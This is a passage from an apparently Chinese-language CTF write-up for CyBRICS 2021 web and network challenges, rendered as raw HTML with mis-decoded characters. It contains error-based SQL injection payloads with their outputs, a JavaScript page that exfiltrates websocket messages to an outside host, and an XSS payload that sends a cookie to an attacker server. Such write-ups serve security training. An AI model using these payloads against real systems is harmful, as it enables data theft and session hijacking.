&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">max_redirects&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&amp;#34;&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="announcement-web-easy-60-pts">Announcement (Web, Easy, 60 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>Ladies and gentlemen!&lt;/p>
&lt;p>Allow us to introduce a brand new project â€”
âš The Flag&lt;/p>
&lt;p>&lt;a href="http://announcement-cybrics2021.ctf.su/">Announcement website&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ç®€çº¦æ¼‚äº®çš„å‰ç«¯&lt;/p>
&lt;p>æœ‰ä¸ªè¾“å…¥é‚®ç®±çš„æ¡†ï¼Œæäº¤ä¼šå‘é€ä¸€ä¸ªpostè¯·æ±‚ï¼šdigest=xxxx&amp;amp;email=xxxx
å°è¯•ä¸€ä¸ª1@1.comï¼Œé‡æ”¾çš„æ—¶å€™ç›´æ¥ä¿®æ”¹emailå€¼ä¼šæç¤ºInvalid digestï¼Œå‘ç°å…¶ä¸­digestçš„å€¼å°±æ˜¯md5(&amp;lsquo;&lt;a href="mailto:1@1.com">1@1.com&lt;/a>&amp;rsquo;) éšemailè€Œæ”¹å˜ï¼Œå°è¯•æ³¨å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>digest=76af11f3eaf7b12e72d7d88e4cf2ee01&amp;amp;email='or'1 // å›æ˜¾æ­£å¸¸ æ— æŠ¥é”™
digest=c3593d255957d60d5d489ae682da8aee&amp;amp;email=1')# // æŠ¥é”™ï¼šSomething went wrong during database insert: Column count doesn't match value count at row 1
digest=5c07c683d062d17ec799fa177ce88058&amp;amp;email=1',1)# // æŠ¥é”™ï¼šSomething went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1
&lt;/code>&lt;/pre>&lt;p>ç¡®å®šæ˜¯sqli å¹¶ä¸”å½“å‰è¡¨æœ‰ä¸¤åˆ— email+timestampï¼Œä½¿ç”¨çš„è¯­å¥åº”è¯¥æ˜¯è¿™ä¸ªå§ï¼Ÿ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">insert&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table_name&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">timestamp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">values&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">now&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯åˆ©ç”¨çš„éƒ¨åˆ†æ˜¯å¯ä»¥æ’å…¥çš„emailï¼ŒæŠ¥é”™æ³¨å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>digest=e1e79bd6fafe38f7073ec1f3ef1513fa&amp;amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))# // Something went wrong during database insert: XPATH syntax error: '~announcement'
digest=c9f14624524736a74164cc6024fdefce&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~emails,logs'
digest=94707222b90505ab0aa5e1fd3916e77d&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~log'
digest=66bf6db11d9bee8e897b874a430f5704&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or ' // Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}'
&lt;/code>&lt;/pre>&lt;p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç»å…¸æŠ¥é”™æ³¨å…¥æµç¨‹ï¼šç¡®å®šå­—æ®µæ•°-&amp;gt;çˆ†æ•°æ®åº“å(announcement)-&amp;gt;è¡¨å(emails, logs)-&amp;gt;å­—æ®µå(log)-&amp;gt;å…·ä½“æ•°æ® æ‹¿flag&lt;/p>
&lt;h2 id="multichat-web-medium-138-pts">Multichat (Web, Medium, 138 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>Yet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.&lt;/p>
&lt;p>Tip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): &amp;ldquo;&lt;code>Hey, i forgot the flag. Can you remind me?&lt;/code>&amp;rdquo;. Then admin will tell him the flag.&lt;/p>
&lt;p>&lt;a href="http://multichat-cybrics2021.ctf.su/">Multichat website&lt;/a>&lt;/p>
&lt;p>Team token for the support call: &lt;code>p32vhJKrnx_hajUc8nLTFw&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>èŠå¤©å®¤ï¼Œadminå’Œtech supportåœ¨ä¸€ä¸ªç§˜å¯†çš„èŠå¤©å®¤å†…ï¼ˆ10ä½æ•°å­—çš„æˆ¿é—´å·ï¼‰ï¼Œtech supportå¯ä»¥è®©adminç»™å‡ºflagï¼ˆåé¢é‚£ä¸ªteam token for the support callæ˜¯è¦ç”¨åˆ°å—è¿˜æ˜¯æ€ä¹ˆæ ·&lt;/p>
&lt;p>æŠ“åŒ…ï¼Œçœ‹åˆ°äº†&lt;code>Connection: Upgrade&lt;/code> &lt;code>Upgrade: websocket&lt;/code>ï¼Œè¿™ä¸ªèŠå¤©å®¤æ˜¯å»ºç«‹äº†ä¸€ä¸ªwebsocketè¿æ¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724225447805.png" alt="image-20210724225447805">ï¼ˆwebsocketè¿™å—çŸ¥è¯†å°è±¡ä¸­ä¹‹å‰æ¥è§¦è¿‡ä¸€æ¬¡ ä¹Ÿå°±ä¸€æ¬¡ ç›¸å…³é“¾æ¥è¿˜æ˜¯æ”¾åé¢&lt;/p>
&lt;p>é“¾æ¥é‡Œçš„ä¸€ä¸ªcsrfæ”»å‡»çš„å®ä¾‹è·Ÿè¿™ä¸ªæœ‰ç‚¹åƒäº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724232946228.png" alt="image-20210724232946228">&lt;/p>
&lt;p>ä½†æ˜¯è¿™é‡Œçš„åˆä¸å¤ªä¸€æ ·ï¼Œwebsocketæœ€åˆå»ºç«‹æ—¶çš„httpéƒ¨åˆ† cookieä¸­æœ‰chatroomçš„idï¼Œè¿™ä¸ªå€¼æ˜¯æœªçŸ¥çš„ï¼ˆ&lt;em>Admin and tech support are members of a secret chat room.&lt;/em>ï¼‰ï¼›å¦å¤–tech supportæ˜¯å…ˆä¼šå‘*â€˜Hey, i forgot the flag. Can you remind me?â€™*ï¼Œéœ€è¦çš„æ˜¯è§¦å‘ï¼ˆå¦‚æœå®ƒä¸ä¼šè‡ªå·±å‘è¿™ä¸€æ¡å†…å®¹çš„è¯ï¼‰å’Œç›‘å¬å®ƒçš„ä¿¡æ¯ ç„¶åæ•æ‰åˆ°å®ƒçš„ä¸‹ä¸€æ¡adminå‘é€çš„å†…å®¹ï¼Œæ‹¿åˆ°flag&lt;/p>
&lt;p>ï¼ˆæ¯”èµ›çš„æ—¶å€™å°±æƒ³åˆ°è¿™é‡Œï¼Œå…·ä½“çš„å®ç°ä¸çŸ¥é“è¯¥æ€ä¹ˆå¼„äº†ï¼Œä»¥ä¸‹æ˜¯çœ‹äº†wpä¹‹åçš„å¤ç°ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001013129.png" alt="image-20210728001013129">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001122843.png" alt="image-20210728001122843">&lt;/p>
&lt;p>5000ç«¯å£å¤„æœ‰Supporté¡µé¢ï¼Œtech supportåœ¨è¿™é‡Œå¯ä»¥è®¿é—®ä»»æ„çš„é¡µé¢å¹¶å»ºç«‹websocketå‘é€æ¶ˆæ¯ï¼Œä¸é™åˆ¶è·¨åŸŸ æ‰€ä»¥å¯ä»¥å°†è‡ªå·±çš„ç½‘ç«™å†™åˆ°è¿™é‡Œï¼Œsupportä¼šå¸¦ç€å®ƒçš„cookieï¼ˆå’Œadminåœ¨ä¸€ä¸ªæˆ¿é—´é‡Œ cookieæ˜¯æˆ¿é—´idï¼‰è¿‡æ¥è®¿é—®ï¼Œç„¶åå€ŸåŠ©jsçš„è„šæœ¬æ‹¿åˆ°å®ƒçš„cookieï¼›ä»¥ä¸‹æ˜¯&lt;a href="https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw">æ¥è‡ªw&amp;amp;mçš„è„šæœ¬&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;text/javascript&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">WebSocket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ws://multichat-cybrics2021.ctf.su/ws&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onclose&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#ae81ff">1003&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`Status: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">reason&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Connection closed.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">item&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;connected&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onmessage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hey, i forgot the flag. Can you remind me?&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2000&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…éé¢„æœŸè§£ï¼šåœ¨urléƒ¨åˆ†è¿›è¡Œxssï¼Œpayload: &lt;code>javascript:location.href='http://vps/?cookie='+document.cookie&lt;/code>ï¼ˆæ­¤å¤„ç”¨çš„æ˜¯burp collaboratorï¼‰ç›´æ¥å¯ä»¥è·å–æˆ¿é—´å·ï¼Œè¿å…¥æˆ¿é—´åå‘æ¶ˆæ¯å³å¯æ‹¿åˆ°flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729144122926.png" alt="image-20210729144122926">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729143946243.png" alt="image-20210729143946243">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.runoob.com/html/html5-websocket.html">HTML5 WebSocket&lt;/a> | &lt;a href="https://wiki.wgpsec.org/knowledge/web/websocket-sec.html">WebSocketå®‰å…¨é—®é¢˜åˆ†æ&lt;/a> &lt;a href="https://segmentfault.com/a/1190000014582485">WebSocketæ–­å¼€åŸå› åˆ†æ&lt;/a> | &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Request/mode">Request.mode&lt;/a> &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch">ä½¿ç”¨ Fetch&lt;/a> | &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WindowOrWorkerGlobalScope/fetch">WorkerOrGlobalScope.fetch()&lt;/a> | &lt;a href="https://www.freebuf.com/news/193447.html">Burpsuite Collaboratoræ¨¡å—è¯¦è§£&lt;/a> | &lt;a href="https://blog.fabiopires.pt/running-your-instance-of-burp-collaborator-server/">Running Your Instance of Burp Collaborator Server&lt;/a>ï¼ˆåˆ—å…¥å¾…å®Œæˆè®¡åˆ’&lt;/p>
&lt;h2 id="ascii-terminal-network-baby-116-pts">ASCII Terminal (Network, Baby, 116 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Artur Khanov (&lt;a href="https://t.me/awengar">@awengar&lt;/a>)&lt;/p>
&lt;p>At &lt;code>138.68.83.253:3333&lt;/code> you have an ASCII terminal. It really works, check with the &lt;a href="https://cybrics.net/files/id.txt">&lt;strong>id command&lt;/strong>&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ncè¿ä¸Šä»¥åå¯ä»¥çœ‹åˆ°ä¸€ä¸ªbash $ï¼Œé¢˜ç›®çš„æç¤ºæ˜¯&amp;quot;ASCII termial&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728231402633.png" alt="image-20210728231402633">&lt;/p>
&lt;p>æŠŠè¦æ‰§è¡Œçš„å‘½ä»¤ä¹Ÿè¡¨ç¤ºæˆè¿™ç§å½¢å¼åå‘é€å³å¯ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯linuxä¸‹çš„toiletå·¥å…·&lt;/p>
&lt;p>toiletå¯ä»¥æŠŠå­—æ¯æ‹¼æˆç”¨å­—ç¬¦æˆ–å…¶ä»–æ–¹å¼è¡¨ç¤ºçš„æ›´å¤§çš„å­—æ¯ï¼Œå¯ä»¥å¸¦ä¸€äº›å‚æ•°æ¥æ§åˆ¶å­—ä½“ å­—å·ä»¥åŠæ ·å¼ æ¯”å¦‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234413850.png" alt="image-20210728234413850">&lt;/p>
&lt;p>å¯ä»¥ç©å‡ºå¾ˆå¤šèŠ±æ ·~&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234351668.png" alt="image-20210728234351668">&lt;/p>
&lt;p>ä¹¦å½’æ­£é¢˜ï¼Œè¿™é‡Œä½¿ç”¨&lt;code>toilet -f bigascii9 +command&lt;/code>çš„å‘½ä»¤ç”Ÿæˆç»“æœï¼Œå°†ç©ºæ ¼æ¢ä¸º &lt;code>.&lt;/code>å†å‘é€å³å¯&lt;/p>
&lt;pre tabindex="0">&lt;code>toilet -f bigascii9 ls &amp;gt; ls.txt
cat ls.txt | nc 138.68.83.253 3333 &amp;gt; ls_result.txt
toilet -f bigascii9 'cat flag.txt' &amp;gt; cat.txt
cat cat.txt | nc 138.68.83.253 2333 &amp;gt; flag.txt
&lt;/code>&lt;/pre>&lt;p>ï¼ˆå€¼å¾—æ³¨æ„çš„æ˜¯ å¦‚æœç›´æ¥ä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤ç”Ÿæˆç›¸åº”æ–‡ä»¶åç”¨vimç¼–è¾‘å™¨çš„&lt;code>%s/\s/./g&lt;/code>å‘½ä»¤æ¥è¿›è¡Œç©ºæ ¼çš„æ›¿æ¢ï¼Œä¼šå‡ºç°ä¸‹é¢è¿™æ ·çš„æƒ…å†µ é¦–éƒ¨å’Œå°¾éƒ¨éƒ½éœ€è¦æ‰‹åŠ¨ä¿®æ­£ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729002105318.png" alt="image-20210729002105318">&lt;/p>
&lt;p>æœ€åflagï¼šcybrics{T3553R4C7_15_GOOD}&lt;/p>
&lt;p>â€”â€”â€”â€”psï¼šåœ¨èµ›åçš„å®˜æ–¹youtubeç›´æ’­è®²è§£ä¸­å±•ç¤ºäº†è¿™ä¸ªascii terminalçš„æºç ï¼Œæ˜¯ä½¿ç”¨pythonç¼–å†™çš„ å¯¹è¿™ä¸ªterminalçš„è¿è¡Œæ„Ÿå…´è¶£çš„å¯ä»¥åˆ°&lt;a href="https://www.youtube.com/watch?v=SFnj6DRTIzE&amp;amp;t=2605s">å½•æ’­è§†é¢‘&lt;/a>ä¸­çœ‹&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.shuzhiduo.com/A/RnJW9QLBdq/">è°ƒçš®æ£è›‹çš„Linuxä¸‹æœ‰è¶£ç»ˆç«¯çš„åˆé›†&lt;/a> | &lt;a href="https://www.howtoing.com/create-ascii-text-banners-in-linux-terminal">Linux Fun - å¦‚ä½•åœ¨ç»ˆç«¯ä¸­åˆ›å»ºASCIIæ–‡æœ¬æ¨ªå¹…&lt;/a> | &lt;a href="https://www.howtoing.com/neofetch-shows-linux-system-information-with-logo/">Neofetch - æ˜¾ç¤ºå…·æœ‰åˆ†å‘æ ‡å¿—çš„Linuxç³»ç»Ÿä¿¡æ¯&lt;/a>&lt;/p>
&lt;h2 id="lx-100-network-easy-192-pts">LX-100 (Network, Easy, 192 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>We were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.&lt;/p>
&lt;p>Anyway, we were discussing CyBRICS flags there, hope thereâ€™s no way to leak them.&lt;/p>
&lt;p>&lt;a href="https://cybrics.net/files/lx100.pcap">&lt;strong>lx100.pcap&lt;/strong>&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ï¼ˆè¯´å®è¯ï¼ŒpacpåŒ…æ˜¯çœŸçš„ä¸ä¼šçœ‹TAT&lt;/p>
&lt;p>é¦–å…ˆçœ‹åˆ°æœ‰HTTPçš„æµé‡ï¼Œè®¿é—®çš„æ˜¯http://192.168.54.1/cam.cgi?mode=getstateï¼Œè¿™æ˜¯Lumix GX80æ‘„åƒå¤´ï¼Œè§†é¢‘æµé€šè¿‡UDPä¼ è¾“ï¼›è¿½è¸ªUDPæµé‡ï¼Œå¯¼å‡ºæµé‡ å¹¶æ‰¹é‡æå–å‡ºå…¶ä¸­çš„jpgæ–‡ä»¶
ï¼ˆä»¥ä¸‹æ˜¯å®˜æ–¹ç»™å‡ºçš„è§£ ä½¿ç”¨äº†tsharkå·¥å…·ï¼ˆå³å‘½ä»¤è¡Œç‰ˆçš„wireshrkï¼ˆä½†æ˜¯è¿™ç§æ–¹æ³•æœ¬åœ°å¤ç°å¤±è´¥ å¯¼å‡ºçš„jpgæ— æ³•æ­£å¸¸è§£æ ä½†æ˜¯&lt;a href="https://www.youtube.com/watch?v=Sf_0f8PWNuI&amp;amp;t=80s">å®˜æ–¹è§†é¢‘ä¸­&lt;/a>ç¡®å®è¿™æ ·å¯ä»¥æˆåŠŸ emmmm&lt;/p>
&lt;pre tabindex="0">&lt;code>tshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data &amp;gt; hex.txt
php -a
foreach(file(&amp;quot;hex.txt&amp;quot;)as $i =&amp;gt; $ln) {file_put_contents(&amp;quot;frame$i.jpg&amp;quot;,hex2bin(trim($ln)));}
&lt;/code>&lt;/pre>&lt;p>ï¼ˆä»¥ä¸‹æ˜¯åœ¨&lt;a href="https://scavengersecurity.com/posts/cybrics-lx100/">åˆ«çš„wp&lt;/a>ä¸­çœ‹åˆ°çš„pyè„šæœ¬ï¼š å¯æˆåŠŸå¤ç° å¯¼å‡º455å¼ jpgå›¾&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pyshark&lt;/span>
&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pyshark&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FileCapture&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lx100.pcap&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;UDP&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;udp&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">srcport&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">65415&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
